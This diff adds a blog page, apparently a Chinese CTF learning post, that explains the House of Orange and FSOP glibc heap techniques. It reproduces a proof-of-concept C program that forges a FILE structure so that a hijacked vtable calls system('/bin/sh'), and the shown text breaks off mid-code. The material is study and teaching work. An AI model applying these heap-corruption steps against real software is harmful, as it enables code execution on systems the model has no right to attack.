@@ -1,0 +1,1131 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="本文参考 https://www.cnblogs.com/ZIKH26/articles/16712469.html\nHouse of orange house of orange是一种利用堆溢出改小topchunk的size,然后通过申请一个大小在topchunk_size和mmap阈值(0x20000)之间的chunk，从而将原本的topchunk放入unsortedbin中的方法\n">
+<title>House of orange&amp;&amp;FSOP</title>
+
+<link rel='canonical' href='http://localhost:1313/p/house-of-orangefsop/'>
+
+<link rel="stylesheet" href="/scss/style.min.84466b97fc2839f50008967839ac7e52db98eefba6b8d2a771a97db8f36059e7.css"><meta property='og:title' content="House of orange&&FSOP">
+<meta property='og:description' content="本文参考 https://www.cnblogs.com/ZIKH26/articles/16712469.html\nHouse of orange house of orange是一种利用堆溢出改小topchunk的size,然后通过申请一个大小在topchunk_size和mmap阈值(0x20000)之间的chunk，从而将原本的topchunk放入unsortedbin中的方法\n">
+<meta property='og:url' content='http://localhost:1313/p/house-of-orangefsop/'>
+<meta property='og:site_name' content='fuguang&#39;s storys'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='pwn' /><meta property='article:tag' content='House系列学习' /><meta property='article:published_time' content='2026-03-08T00:43:28&#43;08:00'/><meta property='article:modified_time' content='2026-03-08T00:43:28&#43;08:00'/><meta property='og:image' content='http://localhost:1313/image/House_of_orange.png' />
+<meta name="twitter:title" content="House of orange&&FSOP">
+<meta name="twitter:description" content="本文参考 https://www.cnblogs.com/ZIKH26/articles/16712469.html\nHouse of orange house of orange是一种利用堆溢出改小topchunk的size,然后通过申请一个大小在topchunk_size和mmap阈值(0x20000)之间的chunk，从而将原本的topchunk放入unsortedbin中的方法\n"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='http://localhost:1313/image/House_of_orange.png' />
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu_c17c68125d7ac105.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">🍥</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">fuguang&#39;s storys</a></h1>
+            <h2 class="site-description">Welcome ~</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://github.com/fu9-dotom/fu9-dotom.github.io'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>主页</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%85%B3%E4%BA%8E/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>归档</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/links/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>Links</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>暗色模式</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#house-of-orange">House of orange</a>
+      <ol>
+        <li><a href="#总结">总结</a></li>
+      </ol>
+    </li>
+    <li><a href="#fsop">FSOP</a>
+      <ol>
+        <li><a href="#fsop介绍">FSOP介绍</a></li>
+        <li><a href="#fsop布局">FSOP布局</a></li>
+        <li><a href="#需要绕过的检查">需要绕过的检查</a></li>
+      </ol>
+    </li>
+    <li><a href="#buuhouseoforange_hitcon_2016">[BUU]houseoforange_hitcon_2016</a>
+      <ol>
+        <li><a href="#思路">思路</a></li>
+      </ol>
+    </li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/p/house-of-orangefsop/">
+                
+                    <img src="/image/House_of_orange.png" loading="lazy" alt="Featured image of post House of orange&amp;&amp;FSOP" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/pwn/" style="background-color: #2a9d8f; color: #fff;">
+                Pwn
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/house-of-orangefsop/">House of orange&amp;&amp;FSOP</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Mar 08, 2026</time>
+            </div>
+        
+
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <p>本文参考
+<a class="link" href="https://www.cnblogs.com/ZIKH26/articles/16712469.html"  target="_blank" rel="noopener"
+    >https://www.cnblogs.com/ZIKH26/articles/16712469.html</a></p>
+<h2 id="house-of-orange">House of orange
+</h2><p>house of orange是一种利用堆溢出改小topchunk的size,然后通过申请一个大小在topchunk_size和mmap阈值(0x20000)之间的chunk，从而将原本的topchunk放入unsortedbin中的方法</p>
+<p>其作用就是在没有free函数的情况下创造一个unsortedbin_chunk</p>
+<p>需要绕过的两个检测如下</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl">  <span class="n">old_top</span> <span class="o">=</span> <span class="n">av</span><span class="o">-&gt;</span><span class="n">top</span><span class="p">;</span><span class="c1">//原本old top chunk的地址
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">old_size</span> <span class="o">=</span> <span class="nf">chunksize</span> <span class="p">(</span><span class="n">old_top</span><span class="p">);</span><span class="c1">//原本old top chunk的size
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">old_end</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="p">(</span><span class="nf">chunk_at_offset</span> <span class="p">(</span><span class="n">old_top</span><span class="p">,</span> <span class="n">old_size</span><span class="p">));</span><span class="c1">//old top chunk的地址加上其size
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">  <span class="n">brk</span> <span class="o">=</span> <span class="n">snd_brk</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="p">(</span><span class="n">MORECORE_FAILURE</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="cm">/*
+</span></span></span><span class="line"><span class="cl"><span class="cm">     If not the first time through, we require old_size to be
+</span></span></span><span class="line"><span class="cl"><span class="cm">     at least MINSIZE and to have prev_inuse set.
+</span></span></span><span class="line"><span class="cl"><span class="cm">   */</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="nf">assert</span> <span class="p">((</span><span class="n">old_top</span> <span class="o">==</span> <span class="nf">initial_top</span> <span class="p">(</span><span class="n">av</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="n">old_size</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="o">||</span>
+</span></span><span class="line"><span class="cl">          <span class="p">((</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span> <span class="p">(</span><span class="n">old_size</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="n">MINSIZE</span> <span class="o">&amp;&amp;</span>
+</span></span><span class="line"><span class="cl">           <span class="nf">prev_inuse</span> <span class="p">(</span><span class="n">old_top</span><span class="p">)</span> <span class="o">&amp;&amp;</span>
+</span></span><span class="line"><span class="cl">           <span class="p">((</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span> <span class="n">old_end</span> <span class="o">&amp;</span> <span class="p">(</span><span class="n">pagesize</span> <span class="o">-</span> <span class="mi">1</span><span class="p">))</span> <span class="o">==</span> <span class="mi">0</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="nf">assert</span> <span class="p">((</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span> <span class="p">(</span><span class="n">old_size</span><span class="p">)</span> <span class="o">&lt;</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span> <span class="p">(</span><span class="n">nb</span> <span class="o">+</span> <span class="n">MINSIZE</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">  
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>第一个assert的第一种情况要满足old_size==0，而在我们利用时topchunk已初始化，size不为0，所以只能第二种条件</p>
+<p>1 ((unsigned long) (old_size) &gt;= MINSIZE,旧topchunk_size大于最小size</p>
+<p>2 prev_inuse (old_top),要求旧topchunk prev_use位为1</p>
+<p>3 ((unsigned long) old_end &amp; (pagesize - 1)) == 0))，topchunk_addr+topchunk_size满足页对齐也就是该address&amp;0xfff=0</p>
+<h3 id="总结">总结
+</h3><p>修改size时满足</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="mi">1</span>  <span class="n">size</span><span class="o">&lt;</span><span class="n">MINSIZE</span>
+</span></span><span class="line"><span class="cl"><span class="mi">2</span> <span class="n">prev_inuse</span><span class="o">=</span><span class="mi">1</span>
+</span></span><span class="line"><span class="cl"><span class="mi">3</span> <span class="n">topchunk_addr</span><span class="o">+</span><span class="n">size</span><span class="o">&amp;</span><span class="mh">0xfff</span><span class="o">=</span><span class="mi">0</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>再次申请chunk满足</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="mi">1</span> <span class="err">申请</span><span class="n">chunk的nb</span><span class="o">+</span><span class="n">MINSIZE大于topchunk_size</span>
+</span></span><span class="line"><span class="cl"><span class="mi">2</span> <span class="n">nb</span><span class="o">&lt;</span><span class="mh">0x20000</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>单纯house of orange起到的作用非常优有限，通常和其他手法结合使用，与FSOP结合就是一种经典的利用方法</p>
+<h2 id="fsop">FSOP
+</h2><h3 id="fsop介绍">FSOP介绍
+</h3><p>程序所有FILE由字段由_IO_FILE结构体当中的_chain字段连接成链表，这个链表的表头是_IO_liast_all,FSOP通过修改_IO_list_all和_chain字段，使IO_FILE落到可控内存中。然后使用_IO_flush_all_lockp（也就是fflush）刷新文件流，fflush最终调用vtable中的_IO_overflow</p>
+<p>前面提到了FSOP将IO_FILE修改成了我们可控的地址，所以我们可以修改vtable的_IO_overflow为system ，而这个函数的第一个参数就是IO_FILE结构体的地址，因此我们让IO_FILE结构体中的flags成员为/bin/sh字符串，那么当<strong>执行exit函数</strong>或者<strong>libc执行abort流程(2.26及之前)<strong>时或者</strong>程序从main函数返回时</strong>触发了_IO_flush_all_lockp即可拿到shell</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span><span class="lnt">76
+</span><span class="lnt">77
+</span><span class="lnt">78
+</span><span class="lnt">79
+</span><span class="lnt">80
+</span><span class="lnt">81
+</span><span class="lnt">82
+</span><span class="lnt">83
+</span><span class="lnt">84
+</span><span class="lnt">85
+</span><span class="lnt">86
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">winner</span> <span class="p">(</span> <span class="kt">char</span> <span class="o">*</span><span class="n">ptr</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="o">*</span><span class="n">p1</span><span class="p">,</span> <span class="o">*</span><span class="n">p2</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">size_t</span> <span class="n">io_list_all</span><span class="p">,</span> <span class="o">*</span><span class="n">top</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nf">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&#34;The attack vector of this technique was removed by changing the behavior of malloc_printerr, &#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;which is no longer calling _IO_flush_all_lockp, in 91e7cf982d0104f0e71770f5ae8e3faf352dea9f (2.26).</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nf">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&#34;Since glibc 2.24 _IO_FILE vtable are checked against a whitelist breaking this exploit,&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;https://sourceware.org/git/?p=glibc.git;a=commit;h=db3476aff19b75c4fdefbe65fcd5f0a90588ba51</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="cm">/*
+</span></span></span><span class="line"><span class="cl"><span class="cm">      Firstly, lets allocate a chunk on the heap.
+</span></span></span><span class="line"><span class="cl"><span class="cm">    */</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">p1</span> <span class="o">=</span> <span class="nf">malloc</span><span class="p">(</span><span class="mh">0x400</span><span class="o">-</span><span class="mi">16</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">top</span> <span class="o">=</span> <span class="p">(</span><span class="kt">size_t</span> <span class="o">*</span><span class="p">)</span> <span class="p">(</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">p1</span> <span class="o">+</span> <span class="mh">0x400</span> <span class="o">-</span> <span class="mi">16</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">top</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xc01</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">p2</span> <span class="o">=</span> <span class="nf">malloc</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">io_list_all</span> <span class="o">=</span> <span class="n">top</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x9a8</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">top</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="n">io_list_all</span> <span class="o">-</span> <span class="mh">0x10</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="cm">/*
+</span></span></span><span class="line"><span class="cl"><span class="cm">      At the end, the system function will be invoked with the pointer to this file pointer.
+</span></span></span><span class="line"><span class="cl"><span class="cm">      If we fill the first 8 bytes with /bin/sh, it is equivalent to system(/bin/sh)
+</span></span></span><span class="line"><span class="cl"><span class="cm">    */</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nf">memcpy</span><span class="p">(</span> <span class="p">(</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">top</span><span class="p">,</span> <span class="s">&#34;/bin/sh</span><span class="se">\x00</span><span class="s">&#34;</span><span class="p">,</span> <span class="mi">8</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">top</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x61</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">FILE</span> <span class="o">*</span><span class="n">fp</span> <span class="o">=</span> <span class="p">(</span><span class="n">FILE</span> <span class="o">*</span><span class="p">)</span> <span class="n">top</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="cm">/*
+</span></span></span><span class="line"><span class="cl"><span class="cm">      1. Set mode to 0: fp-&gt;_mode &lt;= 0
+</span></span></span><span class="line"><span class="cl"><span class="cm">    */</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_mode</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="c1">// top+0xc0
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="cm">/*
+</span></span></span><span class="line"><span class="cl"><span class="cm">      2. Set write_base to 2 and write_ptr to 3: fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base
+</span></span></span><span class="line"><span class="cl"><span class="cm">    */</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="mi">2</span><span class="p">;</span> <span class="c1">// top+0x20
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="mi">3</span><span class="p">;</span> <span class="c1">// top+0x28
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="cm">/*
+</span></span></span><span class="line"><span class="cl"><span class="cm">      4) Finally set the jump table to controlled memory and place system there.
+</span></span></span><span class="line"><span class="cl"><span class="cm">      The jump table pointer is right after the FILE struct:
+</span></span></span><span class="line"><span class="cl"><span class="cm">      base_address+sizeof(FILE) = jump_table
+</span></span></span><span class="line"><span class="cl"><span class="cm">
+</span></span></span><span class="line"><span class="cl"><span class="cm">         4-a)  _IO_OVERFLOW  calls the ptr at offset 3: jump_table+0x18 == winner
+</span></span></span><span class="line"><span class="cl"><span class="cm">    */</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kt">size_t</span> <span class="o">*</span><span class="n">jump_table</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">top</span><span class="p">[</span><span class="mi">12</span><span class="p">];</span> <span class="c1">// controlled memory
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">jump_table</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">size_t</span><span class="p">)</span> <span class="o">&amp;</span><span class="n">winner</span><span class="p">;</span>
